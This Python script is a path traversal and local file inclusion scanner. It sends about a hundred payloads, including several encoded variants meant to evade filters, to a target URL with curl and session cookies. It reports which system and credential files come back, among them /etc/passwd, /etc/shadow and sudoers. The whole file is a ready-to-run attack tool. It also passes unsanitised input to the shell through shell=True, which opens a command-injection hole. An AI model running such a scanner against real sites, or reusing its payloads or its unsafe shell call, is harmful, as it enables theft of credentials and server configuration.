import subprocess

def test_path_traversal(url, cookies=None):
    try:
        directories = [
    "../../../../../../../../etc/passwd",
    "../../../../../../../../etc/shadow",
    "../../../../../../../../etc/group",
    "../../../../../../../../etc/sudoers",
    "../../../../../../../../etc/apache/conf/httpd.conf",
    "../../../../../../../../etc/apache2/conf/httpd.conf",
    "../../../../../../../../etc/httpd/conf/httpd.conf",
    "../../../../../../../../etc/httpd/httpd.conf",
    "../../../../../../../../etc/php.ini",
    "../../../../../../../../etc/my.cnf",
    "../../../../../../../../etc/postgresql/pg_hba.conf",
    "../../../../../../../../etc/postgresql/postgresql.conf",
    "../../../../../../../../etc/lighttpd/lighttpd.conf",
    "../../../../../../../../etc/ssh/sshd_config",
    "../../../../../../../../etc/proftpd.conf",
    "../../../../../../../../etc/vsftpd.conf",
    "../../../../../../../../etc/nginx/nginx.conf",
    "../../../../../../../../etc/tor/tor-tsocks.conf",
    "../../../../../../../../etc/stunnel/stunnel.conf",
    "../../../../../../../../etc/squid/squid.conf",
    "../../../../../../../../etc/samba/smb.conf",
    "../../../../../../../../etc/smb.conf",
    "../../../../../../../../etc/pure-ftpd.conf",
    "../../../../../../../../etc/pure-ftpd/pureftpd.pdb",
    "../../../../../../../../etc/webmin/miniserv.conf",
    "../../../../../../../../etc/vhcs2/proftpd/proftpd.conf",
    "../../../../../../../../etc/ssl/openssl.cnf",
    "../../../../../../../../etc/cron.deny",
    "../../../../../../../../etc/exports",
    "../../../../../../../../etc/aliases",
    "../../../../../../../../etc/hosts",
    "../../../../../../../../etc/hosts.allow",
    "../../../../../../../../etc/hosts.deny",
    "../../../../../../../../etc/resolv.conf",
    "../../../../../../../../etc/sysctl.conf",
    "../../../../../../../../etc/fstab",
    "../../../../../../../../etc/inittab",
    "../../../../../../../../etc/X11/xorg.conf",
    "../../../../../../../../etc/X11/xorg.conf-vesa",
    "../../../../../../../../etc/X11/xorg.conf-vmware",
    "../../../../../../../../etc/ntp.conf",
    "../../../../../../../../etc/snmp/snmpd.conf",
    "../../../../../../../../etc/snmp/snmp.conf",
    "../../../../../../../../etc/mongod.conf",
    "../../../../../../../../etc/redis/redis.conf",
    "../../../../../../../../etc/haproxy/haproxy.cfg",
    "../../../../../../../../etc/logrotate.conf",
    "../../../../../../../../etc/logrotate.d/",
    "../../../../../../../../etc/rsyslog.conf",
    "../../../../../../../../etc/rsyslog.d/",
    "../../../../../../../../etc/syslog-ng/syslog-ng.conf",
    "../../../../../../../../etc/syslog-ng/conf.d/",
    "../../../../../../../../etc/audit/auditd.conf",
    "../../../../../../../../etc/audit/rules.d/",
    "../../../../../../../../etc/cups/cupsd.conf",
    "../../../../../../../../etc/cups/cups-files.conf",
    "../../../../../../../../etc/sysconfig/iptables",
    "../../../../../../../../etc/sysconfig/network-scripts/ifcfg-eth0",
    "../../../../../../../../etc/sysconfig/network",
    "../../../../../../../../etc/sysconfig/httpd",
    "../../../../../../../../etc/sysconfig/selinux",
    "../../../../../../../../etc/sysconfig/networking/",
    "../../../../../../../../etc/sysconfig/firewalld",
    "../../../../../../../../etc/sysconfig/iptables-config",
    "../../../../../../../../etc/sysconfig/ip6tables",
    "../../../../../../../../etc/ssh/ssh_config",
    "../../../../../../../../etc/ssh/sshd_config",
    "../../../../../../../../etc/named.conf",
    "../../../../../../../../etc/named/named.conf",
    "../../../../../../../../etc/named.conf.options",
    "../../../../../../../../etc/named.conf.local",
    "../../../../../../../../etc/ldap/ldap.conf",
    "../../../../../../../../etc/ldap/slapd.conf",
    "../../../../../../../../etc/ldap/slapd.d/",
    "../../../../../../../../etc/dhcp/dhcpd.conf",
    "../../../../../../../../etc/dhcp3/dhcpd.conf",
    "../../../../../../../../etc/dhcp/dhclient.conf",
    "../../../../../../../../etc/dhcp3/dhclient.conf",
    "../../../../../../../../etc/fail2ban/jail.conf",
    "../../../../../../../../etc/fail2ban/jail.local",
    "../../../../../../../../etc/udev/udev.conf",
    "../../../../../../../../etc/udev/rules.d/",
    "../../../../../../../../etc/motion/motion.conf",
    "../../../../../../../../etc/security/limits.conf",
    "../../../../../../../../etc/security/limits.d/",
    "../../../../../../../../etc/security/access.conf",
    "../../../../../../../../etc/security/group.conf",
    "../../../../../../../../etc/varnish/default.vcl",
    "../../../../../../../../etc/php5/apache2/php.ini",
    "../../../../../../../../etc/php5/cli/php.ini",
    "../../../../../../../../etc/php5/cgi/php.ini",
    "../../../../../../../../etc/php5/fpm/php.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd",
    "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd",
    "%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd",
    "..\..\..\..\..\..\..\..\/etc/passwd",
    "..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd",
    "%252e%252e\%252e%252e\/etc/passwd..%5c/etc/passwd",
    "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd",
    "%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd",
    "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd",
    "%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd",
    "..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66/etc/passwd"
]

        num = 0
        num1 = 0
        for directory in directories:
            target_url = f"{url}{directory}"
            curl_command = f"curl -s -b \"{cookies}\" {target_url}"
            result = subprocess.run(curl_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding="utf-8")
            output_parts = result.stdout.split("<!DOCTYPE html>")
            if len(output_parts) > 1:
                content = output_parts[0]
            else:
                content = result.stdout
            if "Failed to open stream" in content or "include(): Failed opening" in content or len(output_parts) == 1:
                print(f"Failed to include file: {target_url}")
                num1 = num1+1
            else:
                print(f"Found: {target_url}")
                num = num+1
    except Exception as e:
        print("Error:", e)
    print(f"Found {num} files in a total of {num+num1} files.")

def main():
    url = input("Enter the URL of the target website: ")

    cookies = input("Enter cookies (optional, PHPSESSID=value; security=value): ")

    print("Brute forcing directory traversal...")
    test_path_traversal(url, cookies=cookies)

if __name__ == "__main__":
    main()
